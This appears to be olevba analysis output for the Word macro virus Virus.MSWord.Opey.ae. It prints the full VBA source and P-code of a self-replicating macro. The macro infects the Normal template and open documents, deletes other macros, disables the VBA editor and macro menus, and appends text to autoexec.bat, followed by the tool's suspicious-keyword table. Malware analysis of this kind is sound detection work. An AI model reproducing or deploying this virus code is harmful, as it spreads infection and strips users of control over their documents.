olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.ae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.ae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KRF.bas 
in file: Virus.MSWord.Opey.ae - OLE stream: 'Macros/VBA/KRF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public IND1  As String

Sub RIA()
On Error Resume Next
Call KRF
NTInfected = False
For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
clan = NormalTemplate.VBProject.VBComponents(i).Name
If clan = "KRF" Then NTInfected = True
If (clan <> "KRF") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next i
For Each opendoc In Documents
ODInfected = False
With opendoc
For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
clan = opendoc.VBProject.VBComponents(j).Name
If clan = "KRF" Then ODInfected = True
If (clan <> "KRF") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next j
If ODInfected = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="KRF", Object:=wdOrganizerObjectProjectItems
opendoc.SaveAs FileName:=opendoc.FullName
End If
End With
Next opendoc
If NTInfected = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="KRF", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End If
Call Introduce
End Sub

Sub FileSave()
On Error Resume Next
Call RIA
ActiveDocument.Save
End Sub
Sub FileClose()
On Error Resume Next
Call RIA
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
Call RIA
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
newfile$ = 1
Call RIA
End Sub
Sub AutoOpen()
On Error Resume Next
Call RIA
End Sub
Sub AutoExec()
On Error Resume Next
Call RIA
End Sub
Sub FileSaveAs()
On Error Resume Next
Call RIA
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
On Error Resume Next
Call RIA
Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
On Error Resume Next
Call RIA
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call RIA
End Sub
Sub xxx()
    open
End Sub

Sub KRF()
On Error Resume Next
Application.UserName = "Young Kim"
Application.UserAddress = "PLM"
Application.UserInitials = "KRF"
With Dialogs(wdDialogFileSummaryInfo)
.Author = "Young Kim"
.Title = "RIA"
.Execute
End With

With Options
.ConfirmConversions = False
.SaveNormalPrompt = False
End With
With ActiveDocument
.ReadOnlyRecommended = False
End With

On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CommandBars("Tools").Controls("Options...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable

End Sub

Sub Introduce()
On Error Resume Next
autoexecfile$ = "c:\autoexec.bat"
hFile = FreeFile
line1$ = ""
If (Year(Date) > 2000) Then
If (Day(Date) = 22) Then
line1$ = "echo Happy KRF Day 12-22 !!!"
End If
If (line1$ <> "") And (IND1 <> "T") Then
Open autoexecfile$ For Append Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, line1$
Print #hFile, "echo from: Young Kim (PLM) 1999-2000"
Print #hFile, "pause"
IND1 = "T"
Close hFile
End If
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.ae
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/KRF - 6978 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn IND1 (As String) 0x000D
' Line #1:
' Line #2:
' 	FuncDefn (Sub RIA())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall (Call) KRF 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #7:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #8:
' 	Ld clan 
' 	LitStr 0x0003 "KRF"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #9:
' 	Ld clan 
' 	LitStr 0x0003 "KRF"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #12:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #13:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #14:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #15:
' 	Ld j 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #16:
' 	Ld clan 
' 	LitStr 0x0003 "KRF"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #17:
' 	Ld clan 
' 	LitStr 0x0003 "KRF"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "KRF"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #21:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndWith 
' Line #24:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "KRF"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #27:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ArgsCall (Call) Introduce 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' Line #32:
' 	FuncDefn (Sub FileSave())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	ArgsCall (Call) RIA 0x0000 
' Line #35:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Sub FileClose())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	ArgsCall (Call) RIA 0x0000 
' Line #40:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #41:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub FileExit())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	ArgsCall (Call) RIA 0x0000 
' Line #46:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #47:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileNew())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #52:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #53:
' 	ArgsCall (Call) RIA 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub AutoOpen())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	ArgsCall (Call) RIA 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub AutoExec())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	ArgsCall (Call) RIA 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub FileSaveAs())
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	ArgsCall (Call) RIA 0x0000 
' Line #66:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub FilePageSetup())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	ArgsCall (Call) RIA 0x0000 
' Line #71:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FilePrint())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	ArgsCall (Call) RIA 0x0000 
' Line #76:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileOpen())
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #81:
' 	ArgsCall (Call) RIA 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub xxx())
' Line #84:
' 	Reparse 0x0008 "    open"
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Sub KRF())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitStr 0x0009 "Young Kim"
' 	Ld Application 
' 	MemSt UserName 
' Line #90:
' 	LitStr 0x0003 "PLM"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #91:
' 	LitStr 0x0003 "KRF"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #92:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #93:
' 	LitStr 0x0009 "Young Kim"
' 	MemStWith Author 
' Line #94:
' 	LitStr 0x0003 "RIA"
' 	MemStWith Title 
' Line #95:
' 	ArgsMemCallWith Execute 0x0000 
' Line #96:
' 	EndWith 
' Line #97:
' Line #98:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #99:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #100:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #101:
' 	EndWith 
' Line #102:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #103:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #104:
' 	EndWith 
' Line #105:
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #108:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #109:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #110:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #111:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #112:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #113:
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #114:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #115:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #116:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #117:
' Line #118:
' 	EndSub 
' Line #119:
' Line #120:
' 	FuncDefn (Sub Introduce())
' Line #121:
' 	OnError (Resume Next) 
' Line #122:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #123:
' 	Ld Friend 
' 	St hFile 
' Line #124:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #125:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #126:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #127:
' 	LitStr 0x001C "echo Happy KRF Day 12-22 !!!"
' 	St line1$ 
' Line #128:
' 	EndIfBlock 
' Line #129:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld IND1 
' 	LitStr 0x0001 "T"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #130:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #132:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo from: Young Kim (PLM) 1999-2000"
' 	PrintItemNL 
' Line #134:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #135:
' 	LitStr 0x0001 "T"
' 	St IND1 
' Line #136:
' 	Ld hFile 
' 	Close 0x0001 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	EndSub 
' Line #140:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

